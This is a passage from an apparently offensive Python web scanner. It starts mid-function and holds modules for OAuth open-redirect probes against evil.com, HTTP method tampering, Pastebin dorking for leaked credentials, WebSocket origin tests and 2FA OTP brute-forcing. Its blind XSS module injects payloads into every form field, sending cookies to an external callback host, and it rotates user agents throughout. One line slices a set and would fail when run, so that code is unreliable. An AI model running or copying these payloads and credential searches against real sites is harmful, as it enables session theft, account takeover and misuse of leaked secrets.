        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        login_paths = [
            '/login', '/signin', '/auth/login', '/auth/signin',
            '/api/login', '/api/auth/login', '/authenticate',
            '/account/login', '/wp-login.php', '/admin/login',
        ]

        for path in login_paths:
            try:
                test_url = f"{base}{path}"
                self._rotate_ua()
                resp = self.session.get(test_url, timeout=5, verify=VERIFY_SSL)
                if resp.status_code == 200:
                    login_urls.append(test_url)
            except Exception:
                continue
        return login_urls

    # ========================================================================
    # 64: OAUTH/SSO MISCONFIGURATION SCANNER
    # ========================================================================

    def scan_oauth_misconfig(self, url):
        """
        Test OAuth/SSO implementations for misconfigurations.
        Open redirect in callback, CSRF in state, token leakage.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Find OAuth endpoints
        oauth_endpoints = self._find_oauth_endpoints(url)

        # Test 1: Open Redirect in OAuth Callback
        result['tested'] += 1
        redirect_params = ['redirect_uri', 'callback_url', 'return_to', 'redirect_url',
                          'next', 'continue', 'returnUrl', 'returnURL']

        evil_redirects = [
            'https://evil.com/callback',
            'https://evil.com',
            f'https://zylon-oauth-test.com/callback',
            f'{base}/callback@evil.com',
            f'{base}/%09/evil.com',
            f'{base}//evil.com',
            f'{base}/..//evil.com',
        ]

        for endpoint in oauth_endpoints:
            for param in redirect_params:
                for evil_url in evil_redirects:
                    result['tested'] += 1
                    try:
                        self._rotate_ua()
                        test_url = f"{endpoint}?{param}={quote(evil_url)}&response_type=code&client_id=test"
                        resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT,
                                              verify=VERIFY_SSL, allow_redirects=False)

                        # Check if redirect goes to evil.com
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location or 'zylon-oauth-test' in location:
                            result['vulnerable'] = True
                            result['findings'].append({
                                'type': 'OAuth Open Redirect',
                                'parameter': param,
                                'payload': evil_url,
                                'redirect_to': location,
                                'severity': 'High',
                                'note': 'OAuth callback redirect not validated - token theft possible'
                            })
                    except Exception:
                        continue

        # Test 2: CSRF in OAuth State Parameter
        result['tested'] += 1
        for endpoint in oauth_endpoints:
            try:
                self._rotate_ua()
                # Request without state parameter
                test_url = f"{endpoint}?redirect_uri={quote(base)}&response_type=code&client_id=test"
                resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL, allow_redirects=False)
                location = resp.headers.get('Location', '')

                # If the OAuth provider proceeds without state, it's vulnerable to CSRF
                if resp.status_code in [301, 302, 303, 307] and location:
                    if 'state' not in location.lower():
                        result['findings'].append({
                            'type': 'Missing OAuth State Parameter',
                            'endpoint': endpoint,
                            'severity': 'High',
                            'note': 'No state parameter in OAuth flow - CSRF attack possible'
                        })
            except Exception:
                pass

        # Test 3: Token Leakage in URL
        result['tested'] += 1
        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            # Check if tokens are in URL (from Referer leaks)
            if regex_cache.search(r'[?&](access_token|token|code|id_token)=', resp.url):
                result['vulnerable'] = True
                result['findings'].append({
                    'type': 'Token in URL Fragment',
                    'severity': 'High',
                    'note': 'OAuth token exposed in URL - can leak via Referer header'
                })
        except Exception:
            pass

        if not oauth_endpoints:
            result['findings'].append({
                'type': 'No OAuth Endpoints Found',
                'severity': 'Info',
                'note': 'No OAuth/SSO endpoints detected on target'
            })

        return result

    def _find_oauth_endpoints(self, url):
        """Find OAuth/SSO endpoints"""
        endpoints = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Check page for OAuth links
        try:
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            soup = BeautifulSoup(resp.text, 'html.parser')

            # Find OAuth login links
            for a in soup.find_all('a', href=True):
                href = a['href']
                if any(x in href.lower() for x in ['oauth', 'auth', 'login', 'signin', 'sso']):
                    if any(x in href.lower() for x in ['google', 'facebook', 'github', 'twitter',
                                                        'linkedin', 'microsoft', 'apple', 'oauth']):
                        endpoints.append(urljoin(url, href))
        except Exception:
            pass

        # Common OAuth paths
        oauth_paths = [
            '/oauth/authorize', '/oauth/auth', '/oauth2/authorize',
            '/auth/oauth', '/api/oauth/authorize', '/oauth/callback',
            '/auth/callback', '/login/oauth', '/sso/login',
            '/.well-known/openid-configuration', '/.well-known/oauth-authorization-server',
        ]

        for path in oauth_paths:
            try:
                test_url = f"{base}{path}"
                self._rotate_ua()
                resp = self.session.get(test_url, timeout=5, verify=VERIFY_SSL, allow_redirects=False)
                if resp.status_code in [200, 301, 302, 303, 307]:
                    endpoints.append(test_url)
            except Exception:
                continue

        return list(set(endpoints))

    # ========================================================================
    # 65: HTTP METHOD TAMPERING
    # ========================================================================

    def scan_http_method_tampering(self, url):
        """
        Test for HTTP method tampering vulnerabilities.
        Try PUT, DELETE, PATCH, TRACE, OPTIONS to bypass auth/access controls.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        methods_to_test = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'OPTIONS', 'HEAD',
                          'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE',
                          'LOCK', 'UNLOCK', 'SEARCH', 'REPORT']

        # Get baseline
        try:
            self._rotate_ua()
            baseline = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            baseline_status = baseline.status_code
            baseline_len = len(baseline.text)
        except Exception:
            result['error'] = 'Cannot connect to target'
            return result

        for method in methods_to_test:
            result['tested'] += 1
            try:
                self._rotate_ua()
                resp = self.session.request(method, url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                if method == 'OPTIONS':
                    # Check Allow header
                    allow = resp.headers.get('Allow', '')
                    if allow:
                        result['findings'].append({
                            'type': 'Allowed HTTP Methods',
                            'methods': allow,
                            'severity': 'Info',
                            'note': f'Server allows: {allow}'
                        })
                    continue

                # Check for interesting status codes
                if resp.status_code == 200 and baseline_status != 200:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'type': 'Method Bypass',
                        'method': method,
                        'status': resp.status_code,
                        'baseline_status': baseline_status,
                        'severity': 'High',
                        'note': f'{method} returned 200 while GET returned {baseline_status}'
                    })
                elif resp.status_code == 200 and abs(len(resp.text) - baseline_len) > 500:
                    result['findings'].append({
                        'type': 'Different Response Size',
                        'method': method,
                        'response_size': len(resp.text),
                        'baseline_size': baseline_len,
                        'severity': 'Medium',
                        'note': f'{method} returned significantly different content size'
                    })
                elif resp.status_code in [201, 204]:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'type': 'Method Allowed',
                        'method': method,
                        'status': resp.status_code,
                        'severity': 'High',
                        'note': f'{method} method succeeded with status {resp.status_code}'
                    })

            except Exception:
                continue

        # Test X-HTTP-Method-Override
        result['tested'] += 1
        try:
            self._rotate_ua()
            override_headers = {
                'X-HTTP-Method-Override': 'PUT',
                'X-HTTP-Method': 'PUT',
                'X-Method-Override': 'PUT',
            }
            for header, value in override_headers.items():
                resp = self.session.post(url, headers={header: value},
                                       timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if resp.status_code != baseline_status:
                    result['findings'].append({
                        'type': 'HTTP Method Override',
                        'header': header,
                        'value': value,
                        'status': resp.status_code,
                        'severity': 'Medium',
                        'note': f'Method override via {header} changed response'
                    })
        except Exception:
            pass

        return result

    # ========================================================================
    # 66: SHODAN INTERNETDB LOOKUP
    # ========================================================================

    def lookup_shodan_internetdb(self, domain):
        """
        Query Shodan InternetDB (free, no API key needed).
        Returns open ports, vulnerabilities, hostnames, CPEs.
        """
        result = {'ports': [], 'vulns': [], 'hostnames': [], 'cpes': [], 'tested': 1}

        # Resolve to IP
        try:
            ip = socket.gethostbyname(domain)
            result['ip'] = ip
        except socket.gaierror:
            result['error'] = f'Cannot resolve {domain}'
            return result

        # Query Shodan InternetDB
        try:
            api_url = f"https://internetdb.shodan.io/{ip}"
            self._rotate_ua()
            resp = self.session.get(api_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if resp.status_code == 200:
                data = resp.json()
                result['ports'] = data.get('ports', [])
                result['vulns'] = data.get('vulns', [])
                result['hostnames'] = data.get('hostnames', [])
                result['cpes'] = data.get('cpes', [])
                result['tags'] = data.get('tags', [])
                result['total_ports'] = len(result['ports'])
                result['total_vulns'] = len(result['vulns'])
            elif resp.status_code == 404:
                result['note'] = 'No Shodan data available for this IP'
            else:
                result['error'] = f'Shodan returned status {resp.status_code}'
        except Exception as e:
            result['error'] = f'Shodan lookup failed: {str(e)[:50]}'

        return result

    # ========================================================================
    # 67: FAVICON HASH DISCOVERY
    # ========================================================================

    def discover_favicon_hash(self, url):
        """
        Calculate favicon hash (mmh3) and find related domains.
        Same favicon = same application, potential origin IP discovery.
        """
        result = {'hash': None, 'shodan_results': [], 'related_domains': [], 'tested': 1}

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Try to find favicon
        favicon_urls = [
            f"{base}/favicon.ico",
            f"{base}/favicon.png",
            f"{base}/static/favicon.ico",
            f"{base}/assets/favicon.ico",
            f"{base}/img/favicon.ico",
            f"{base}/images/favicon.ico",
            f"{base}/public/favicon.ico",
        ]

        # Also check HTML for favicon link
        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for link in soup.find_all('link', rel=lambda x: x and 'icon' in x.lower() if x else False):
                href = link.get('href', '')
                if href:
                    favicon_urls.insert(0, urljoin(url, href))
        except Exception:
            pass

        # Download favicon and calculate hash
        favicon_data = None
        for furl in favicon_urls:
            try:
                self._rotate_ua()
                resp = self.session.get(furl, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if resp.status_code == 200 and len(resp.content) > 10:
                    favicon_data = resp.content
                    result['favicon_url'] = furl
                    break
            except Exception:
                continue

        if not favicon_data:
            result['error'] = 'Could not download favicon'
            return result

        # Calculate hash (simple hash since mmh3 may not be available)
        # We'll use a combination of MD5 and body hash
        import hashlib
        md5_hash = hashlib.md5(favicon_data).hexdigest()

        # Calculate the Shodan favicon hash equivalent
        # Shodan uses: mmh3(base64_encode(favicon))
        b64_data = base64.b64encode(favicon_data).decode()

        # Try mmh3 if available, else use our own hash
        try:
            import mmh3
            favicon_hash = mmh3.hash(b64_data)
            result['hash'] = favicon_hash
            result['hash_type'] = 'mmh3 (Shodan compatible)'
        except ImportError:
            # Use a simpler hash method
            favicon_hash = int(hashlib.md5(b64_data.encode()).hexdigest()[:8], 16)
            result['hash'] = favicon_hash
            result['hash_type'] = 'md5-trunc (install mmh3 for Shodan search)'

        result['md5'] = md5_hash

        # Search Shodan for same favicon (if we have mmh3 hash)
        if result['hash_type'] == 'mmh3 (Shodan compatible)':
            try:
                shodan_url = f"https://www.shodan.io/search?query=http.favicon.hash%3A{result['hash']}"
                self._rotate_ua()
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                resp = self.session.get(shodan_url, headers=headers, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if resp.status_code == 200:
                    # Extract domain results
                    domain_pattern = regex_cache.compile(r'([a-zA-Z0-9._-]+\.[a-zA-Z]{2,})')
                    domains = domain_pattern.findall(resp.text)
                    filtered = [d for d in domains if d.count('.') >= 1 and len(d) < 100
                              and 'shodan' not in d.lower()]
                    result['related_domains'] = list(set(filtered))[:20]
            except Exception:
                pass

        return result

    # ========================================================================
    # 68: PASTEBIN DORKING
    # ========================================================================

    def dork_pastebin(self, domain):
        """
        Search Pastebin and similar sites for leaked data about the target.
        Finds credentials, API keys, configs, internal info.
        """
        result = {'findings': [], 'sources': {}, 'total': 0, 'tested': 3}

        # Source 1: Google search for pastebin + domain
        try:
            query = f"site:pastebin.com \"{domain}\""
            search_url = f"https://html.duckduckgo.com/html/?q=site%3Apastebin.com+%22{domain}%22"
            self._rotate_ua()
            resp = self.session.get(search_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if resp.status_code == 200:
                # Extract pastebin URLs
                pb_urls = regex_cache.findall(r'pastebin\.com/([a-zA-Z0-9]{8})', resp.text)
                pb_urls = list(set(pb_urls))[:10]

                for pb_id in pb_urls:
                    try:
                        raw_url = f"https://pastebin.com/raw/{pb_id}"
                        self._rotate_ua()
                        raw_resp = self.session.get(raw_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                        if raw_resp.status_code == 200 and domain in raw_resp.text:
                            # Check for sensitive data
                            sensitive = self._check_sensitive_content(raw_resp.text, domain)
                            result['findings'].append({
                                'url': f"https://pastebin.com/{pb_id}",
                                'sensitive_types': sensitive,
                                'severity': 'High' if any(s in ['password', 'api_key', 'secret'] for s in sensitive) else 'Medium',
                                'preview': raw_resp.text[:200]
                            })
                    except Exception:
                        continue

                result['sources']['pastebin_duckduckgo'] = len(pb_urls)
        except Exception:
            pass

        # Source 2: Google search for GitHub gists + domain
        try:
            search_url = f"https://html.duckduckgo.com/html/?q=site%3Agist.github.com+%22{domain}%22+password+OR+key+OR+secret"
            self._rotate_ua()
            resp = self.session.get(search_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if resp.status_code == 200:
                gist_urls = regex_cache.findall(r'gist\.github\.com/([a-zA-Z0-9/_-]+)', resp.text)
                result['sources']['github_gist'] = len(set(gist_urls)[:5])
        except Exception:
            pass

        # Source 3: Rentry.co
        try:
            search_url = f"https://html.duckduckgo.com/html/?q=site%3Arentry.co+%22{domain}%22"
            self._rotate_ua()
            resp = self.session.get(search_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if resp.status_code == 200:
                rentry_urls = regex_cache.findall(r'rentry\.co/([a-zA-Z0-9_-]+)', resp.text)
                result['sources']['rentry'] = len(set(rentry_urls)[:5])
        except Exception:
            pass

        result['total'] = len(result['findings'])
        return result

    def _check_sensitive_content(self, text, domain):
        """Check text for sensitive data patterns"""
        sensitive = []
        patterns = {
            'password': [r'password\s*[=:]\s*\S+', r'passwd\s*[=:]\s*\S+', r'pwd\s*[=:]\s*\S+'],
            'api_key': [r'api[_-]?key\s*[=:]\s*\S+', r'apikey\s*[=:]\s*\S+'],
            'secret': [r'secret\s*[=:]\s*\S+', r'token\s*[=:]\s*\S+'],
            'db_connection': [r'(?:mysql|postgres|mongodb|redis)://\S+'],
            'aws_key': [r'AKIA[0-9A-Z]{16}'],
            'private_key': [r'-----BEGIN (?:RSA |DSA )?PRIVATE KEY-----'],
            'email': [rf'[a-zA-Z0-9._%+-]+@{re.escape(domain)}'],
            'internal_url': [rf'https?://[a-zA-Z0-9._-]+\.{re.escape(domain)}(?:/[^\s]*)?'],
        }

        for stype, pattern_list in patterns.items():
            for pattern in pattern_list:
                if regex_cache.search(pattern, text, re.I):
                    sensitive.append(stype)
                    break
        return sensitive

    # ========================================================================
    # 69: URL SHORTENER DISCOVERY
    # ========================================================================

    def discover_url_shorteners(self, domain):
        """
        Find shortened URLs (bit.ly, t.co, etc.) pointing to the target domain.
        Can reveal hidden/internal URLs.
        """
        result = {'short_urls': [], 'expanded_urls': [], 'hidden_paths': [], 'tested': 1}

        # Search for shortened URLs pointing to our domain
        search_queries = [
            f"site:bit.ly \"{domain}\"",
            f"site:t.co \"{domain}\"",
            f"site:tinyurl.com \"{domain}\"",
            f"site:goo.gl \"{domain}\"",
            f"site:ow.ly \"{domain}\"",
            f"site:is.gd \"{domain}\"",
        ]

        for query in search_queries:
            try:
                search_url = f"https://html.duckduckgo.com/html/?q={quote(query)}"
                self._rotate_ua()
                resp = self.session.get(search_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if resp.status_code == 200:
                    # Find short URLs
                    short_patterns = regex_cache.findall(
                        r'(https?://(?:bit\.ly|t\.co|tinyurl\.com|goo\.gl|ow\.ly|is\.gd)/[a-zA-Z0-9]+)',
                        resp.text
                    )
                    result['short_urls'].extend(short_patterns)
            except Exception:
                continue

        # Expand short URLs
        result['short_urls'] = list(set(result['short_urls']))[:20]
        for short_url in result['short_urls']:
            try:
                self._rotate_ua()
                resp = self.session.head(short_url, timeout=DEFAULT_TIMEOUT,
                                       verify=VERIFY_SSL, allow_redirects=True)
                final_url = resp.url
                if domain in final_url:
                    result['expanded_urls'].append({
                        'short': short_url,
                        'expanded': final_url
                    })
                    # Extract path from expanded URL
                    parsed = urlparse(final_url)
                    if parsed.path and parsed.path != '/':
                        result['hidden_paths'].append(parsed.path)
            except Exception:
                continue

        result['total_short'] = len(result['short_urls'])
        result['total_expanded'] = len(result['expanded_urls'])
        result['total_hidden'] = len(result['hidden_paths'])

        return result

    # ========================================================================
    # 70: SECURITY.TXT & ROBOTS.TXT & SITEMAP PARSER
    # ========================================================================

    def parse_security_robots_sitemap(self, url):
        """
        Parse .well-known/security.txt, robots.txt, and sitemap.xml.
        Find contact info, hidden paths, admin areas, and all URLs.
        """
        result = {'security_txt': {}, 'robots_txt': {}, 'sitemap': {}, 'findings': [], 'tested': 3}

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 1. Security.txt
        try:
            sec_url = f"{base}/.well-known/security.txt"
            self._rotate_ua()
            resp = self.session.get(sec_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if resp.status_code == 200:
                content = resp.text
                result['security_txt']['found'] = True
                result['security_txt']['content'] = content

                # Parse fields
                for line in content.split('\n'):
                    line = line.strip()
                    if ':' in line:
                        key, value = line.split(':', 1)
                        result['security_txt'][key.strip()] = value.strip()

                # Check for important fields
                if 'Contact' not in result['security_txt']:
                    result['findings'].append({
                        'type': 'Missing Contact in security.txt',
                        'severity': 'Low',
                        'note': 'security.txt exists but missing Contact field'
                    })
            else:
                result['security_txt']['found'] = False
                result['findings'].append({
                    'type': 'No security.txt',
                    'severity': 'Info',
                    'note': 'No security.txt found - security reporting channel missing'
                })
        except Exception:
            result['security_txt']['found'] = False

        # 2. Robots.txt
        try:
            robots_url = f"{base}/robots.txt"
            self._rotate_ua()
            resp = self.session.get(robots_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if resp.status_code == 200:
                content = resp.text
                result['robots_txt']['found'] = True
                result['robots_txt']['content'] = content

                # Extract Disallow paths
                disallowed = []
                allowed = []
                sitemaps = []
                for line in content.split('\n'):
                    line = line.strip()
                    if line.startswith('Disallow:'):
                        path = line.split(':', 1)[1].strip()
                        if path and path != '/':
                            disallowed.append(path)
                    elif line.startswith('Allow:'):
                        path = line.split(':', 1)[1].strip()
                        if path:
                            allowed.append(path)
                    elif line.startswith('Sitemap:'):
                        sitemap = line.split(':', 1)[1].strip()
                        sitemaps.append(sitemap)

                result['robots_txt']['disallowed'] = disallowed
                result['robots_txt']['allowed'] = allowed
                result['robots_txt']['sitemaps'] = sitemaps

                # Flag interesting disallowed paths
                interesting_paths = []
                for path in disallowed:
                    if any(x in path.lower() for x in ['admin', 'secret', 'private', 'internal',
                                                        'config', 'backup', 'db', 'database',
                                                        'api', 'test', 'dev', 'staging', '.env',
                                                        'debug', 'console', 'panel']):
                        interesting_paths.append(path)

                if interesting_paths:
                    result['findings'].append({
                        'type': 'Interesting Disallowed Paths',
                        'paths': interesting_paths,
                        'severity': 'Medium',
                        'note': 'Disallowed paths may contain sensitive functionality'
                    })
            else:
                result['robots_txt']['found'] = False
        except Exception:
            result['robots_txt']['found'] = False

        # 3. Sitemap.xml
        try:
            sitemap_url = f"{base}/sitemap.xml"
            self._rotate_ua()
            resp = self.session.get(sitemap_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            if resp.status_code == 200:
                result['sitemap']['found'] = True

                # Parse sitemap URLs
                urls = regex_cache.findall(r'<loc>(.*?)</loc>', resp.text)
                result['sitemap']['urls'] = urls[:100]
                result['sitemap']['total'] = len(urls)

                # Find interesting URLs
                interesting = [u for u in urls if any(x in u.lower() for x in
                              ['admin', 'login', 'api', 'secret', 'internal', 'test', 'dev'])]
                if interesting:
                    result['findings'].append({
                        'type': 'Interesting URLs in Sitemap',
                        'urls': interesting[:10],
                        'severity': 'Low',
                        'note': 'Sitemap contains potentially interesting URLs'
                    })
            else:
                result['sitemap']['found'] = False
        except Exception:
            result['sitemap']['found'] = False

        return result

    # ========================================================================
    # 71: BLIND XSS SCANNER
    # ========================================================================

    def scan_blind_xss(self, url, callback_url=None):
        """
        Test for Blind XSS by injecting payloads into form inputs.
        Uses callback URLs for detection (XSS Hunter style).
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        # Default callback domain for blind XSS detection
        if not callback_url:
            callback_url = 'zylonbxss.bxss.me'

        # Blind XSS payloads with callbacks
        blind_payloads = [
            f'"><script src="//{callback_url}"></script>',
            f"'><script src='//{callback_url}'></script>",
            f'"><img src=x onerror="fetch(\'//{callback_url}/\'+document.domain)">',
            f"'><img src=x onerror=\"fetch('//{callback_url}/'+document.domain)\">",
            f'"><svg/onload="fetch(\'//{callback_url}/\'+document.cookie)">',
            f"\"><svg/onload=\"fetch('//{callback_url}/'+document.cookie)\">",
            f"javascript:fetch('//{callback_url}/'+document.domain)",
            f'"><script>new Image().src="//{callback_url}/"+document.cookie</script>',
            f"'><script>new Image().src='//{callback_url}/'+document.cookie</script>",
            f'"><input onfocus=fetch("//{callback_url}/"+document.domain) autofocus>',
            f"`-fetch('//{callback_url}/'+document.domain)//",
        ]

        # Find forms on the page
        forms = self._find_forms(url)

        for form in forms:
            action = form.get('action', url)
            method = form.get('method', 'get').lower()
            inputs = form.get('inputs', [])

            for payload in blind_payloads:
                result['tested'] += 1
                data = {}
                for inp in inputs:
                    name = inp.get('name', '')
                    input_type = inp.get('type', 'text')
                    if name and input_type not in ['submit', 'button', 'file', 'image', 'hidden']:
                        data[name] = payload

                if not data:
                    continue

                try:
                    self._rotate_ua()
                    if method == 'post':
                        resp = self.session.post(action, data=data,
                                               timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                    else:
                        resp = self.session.get(action, params=data,
                                              timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                    # Check if payload was stored (not just reflected)
                    # Blind XSS doesn't show immediate results, but we can check:
                    # 1. Was the input accepted? (not rejected/sanitized)
                    if resp.status_code == 200:
                        # Check if the payload was sanitized
                        if callback_url in resp.text:
                            result['findings'].append({
                                'type': 'Payload Reflected (may also be stored)',
                                'url': action,
                                'method': method.upper(),
                                'fields': list(data.keys()),
                                'severity': 'High',
                                'note': f'Blind XSS payload reflected - likely stored and will fire in admin panel'
                            })
                        else:
                            result['findings'].append({
                                'type': 'Payload Submitted',
                                'url': action,
                                'method': method.upper(),
                                'fields': list(data.keys()),
                                'severity': 'Medium',
                                'note': f'Payload submitted successfully - monitor {callback_url} for callbacks'
                            })
                except Exception:
                    continue

        # Also test common input points directly
        common_inputs = ['q', 'search', 'query', 'name', 'email', 'comment', 'message',
                        'username', 'user', 'input', 'feedback', 'description', 'title']

        for param in common_inputs:
            for payload in blind_payloads[:3]:
                result['tested'] += 1
                try:
                    self._rotate_ua()
                    # GET test
                    resp = self.session.get(url, params={param: payload},
                                          timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                    # POST test
                    resp = self.session.post(url, data={param: payload},
                                           timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                except Exception:
                    continue

        return result

    def _find_forms(self, url):
        """Extract forms from a page"""
        forms = []
        try:
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            soup = BeautifulSoup(resp.text, 'html.parser')

            for form in soup.find_all('form'):
                form_data = {
                    'action': urljoin(url, form.get('action', '')),
                    'method': form.get('method', 'get'),
                    'inputs': []
                }
                for inp in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': inp.get('name', ''),
                        'type': inp.get('type', 'text'),
                        'value': inp.get('value', ''),
                    }
                    if input_data['name']:
                        form_data['inputs'].append(input_data)
                forms.append(form_data)
        except Exception:
            pass
        return forms

    # ========================================================================
    # 72: WEBSOCKET SECURITY TESTER
    # ========================================================================

    def scan_websocket(self, url):
        """
        Test WebSocket connections for security issues.
        Unauthenticated access, origin validation, message injection.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 1}

        parsed = urlparse(url)
        base_domain = parsed.netloc

        # Convert HTTP(S) to WS(S) URLs
        ws_urls = []
        if url.startswith('https://'):
            ws_base = f"wss://{parsed.netloc}"
        else:
            ws_base = f"ws://{parsed.netloc}"

        ws_paths = ['/ws', '/websocket', '/socket', '/live', '/realtime',
                   '/chat', '/stream', '/push', '/notifications',
                   '/api/ws', '/api/websocket', '/api/v1/ws',
                   '/cable', '/socket.io/', '/ws/', '/echo']

        for path in ws_paths:
            ws_urls.append(f"{ws_base}{path}")

        # Also check page for WebSocket URLs
        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            # Find WebSocket URLs in JavaScript
            ws_pattern = regex_cache.findall(r'(?:new\s+WebSocket|ws:|wss:)\s*\(?["\']([^"\']+)["\']', resp.text)
            for ws_match in ws_pattern:
                if ws_match.startswith('/'):
                    ws_urls.append(f"{ws_base}{ws_match}")
                else:
                    ws_urls.append(ws_match)
        except Exception:
            pass

        # Test WebSocket endpoints via HTTP upgrade simulation
        for ws_url in ws_urls:
            result['tested'] += 1
            try:
                # We can't fully test WebSockets without a WebSocket library,
                # but we can check the handshake
                if ws_url.startswith('wss://'):
                    http_url = f"https://{ws_url[6:]}"
                else:
                    http_url = f"http://{ws_url[5:]}"

                self._rotate_ua()
                # Send upgrade request
                headers = {
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13',
                    'Origin': 'https://evil.com',  # Test origin validation
                }

                resp = self.session.get(http_url, headers=headers,
                                       timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL,
                                       allow_redirects=False)

                if resp.status_code == 101:  # Switching Protocols
                    result['vulnerable'] = True

                    # Check if origin was accepted
                    result['findings'].append({
                        'type': 'WebSocket No Origin Validation',
                        'ws_url': ws_url,
                        'origin_test': 'https://evil.com',
                        'severity': 'High',
                        'note': 'WebSocket accepts connections from any origin - CSRF via WebSocket possible'
                    })

                elif resp.status_code == 200:
                    # Might be a WebSocket info page
                    result['findings'].append({
                        'type': 'WebSocket Endpoint Found',
                        'ws_url': ws_url,
                        'status': 200,
                        'severity': 'Info',
                        'note': 'WebSocket endpoint accessible - test with wscat or Burp'
                    })

            except Exception:
                continue

        # Check for common WebSocket libraries
        result['tested'] += 1
        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            ws_indicators = ['socket.io', 'sockjs', 'websocket', 'SignalR', 'ws://', 'wss://']
            found_indicators = [i for i in ws_indicators if i.lower() in resp.text.lower()]
            if found_indicators:
                result['findings'].append({
                    'type': 'WebSocket Library Detected',
                    'indicators': found_indicators,
                    'severity': 'Info',
                    'note': 'WebSocket usage detected - test origin validation manually'
                })
        except Exception:
            pass

        return result

    # ========================================================================
    # 73: 2FA BYPASS TESTER
    # ========================================================================

    def scan_2fa_bypass(self, url):
        """
        Test for 2FA bypass vulnerabilities.
        Response manipulation, OTP reuse, rate limiting, direct API access.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Find 2FA endpoints
        tfa_endpoints = self._find_2fa_endpoints(url)

        if not tfa_endpoints:
            result['findings'].append({
                'type': 'No 2FA Endpoint Found',
                'severity': 'Info',
                'note': 'No 2FA/OTP verification endpoints detected'
            })
            return result

        for tfa_url in tfa_endpoints:
            # Test 1: Rate Limiting on OTP
            result['tested'] += 1
            failed_attempts = 0
            for i in range(15):
                try:
                    self._rotate_ua()
                    resp = self.session.post(tfa_url, data={'otp': f'0000{i}', 'code': f'0000{i}'},
                                           timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                    if resp.status_code == 429:
                        result['findings'].append({
                            'type': 'Rate Limiting on 2FA',
                            'url': tfa_url,
                            'attempts': i + 1,
                            'severity': 'Info',
                            'note': f'Rate limiting triggered after {i + 1} attempts'
                        })
                        break
                    elif resp.status_code == 200:
                        # Might have bypassed
                        result['findings'].append({
                            'type': '2FA Bypass Attempt',
                            'url': tfa_url,
                            'otp': f'0000{i}',
                            'status': 200,
                            'severity': 'High',
                            'note': '2FA endpoint returned 200 with invalid OTP - verify manually'
                        })
                    else:
                        failed_attempts += 1
                except Exception:
                    continue

            if failed_attempts >= 10:
                result['vulnerable'] = True
                result['findings'].append({
                    'type': 'No Rate Limiting on 2FA',
                    'url': tfa_url,
                    'attempts': failed_attempts,
                    'severity': 'High',
                    'note': 'No rate limiting on OTP endpoint - brute force possible'
                })

            # Test 2: Response Manipulation
            result['tested'] += 1
            try:
                self._rotate_ua()
                resp = self.session.post(tfa_url, data={'otp': '000000'},
                                       timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        # Check if we can manipulate the response
                        if data.get('verified') is False or data.get('success') is False:
                            result['findings'].append({
                                'type': '2FA Response Manipulation',
                                'url': tfa_url,
                                'response': str(data)[:200],
                                'severity': 'High',
                                'note': '2FA response contains verification flag - may be client-side only'
                            })
                    except Exception:
                        pass
            except Exception:
                pass

            # Test 3: Direct API Access (bypass 2FA page)
            result['tested'] += 1
            api_paths = ['/api/user', '/api/me', '/api/profile', '/api/account',
                        '/api/dashboard', '/dashboard', '/home', '/account']
